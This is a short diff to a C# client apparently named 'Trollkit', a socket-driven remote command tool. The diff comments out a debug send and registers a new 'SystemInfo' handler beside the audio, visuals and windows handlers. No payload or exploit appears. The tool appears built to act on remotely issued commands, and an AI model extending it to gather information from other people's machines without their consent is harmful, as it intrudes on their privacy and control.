@@ -35,7 +35,7 @@ namespace Trollkit_Client
 					Console.ReadLine();
 					TransferCommandObject returnObject = new TransferCommandObject
 					{ Command = "Debug" };
-					program.receiver.SendCommandObjectToSocket(ClientServerPipeline.BufferSerialize(returnObject));
+					//program.receiver.SendCommandObjectToSocket(ClientServerPipeline.BufferSerialize(returnObject));
 
 					Console.Read();
 					return;
@@ -61,6 +61,7 @@ namespace Trollkit_Client
 			handlers.Add("Audio", new AudioHandler());
 			handlers.Add("Visuals", new VisualsHandler());
 			handlers.Add("Windows", new WindowsHandler());
+			handlers.Add("SystemInfo", new SystemInfoHandler());
 		}
 
 		private void Receiver_OnDataReceived(Socket s, TransferCommandObject Object)
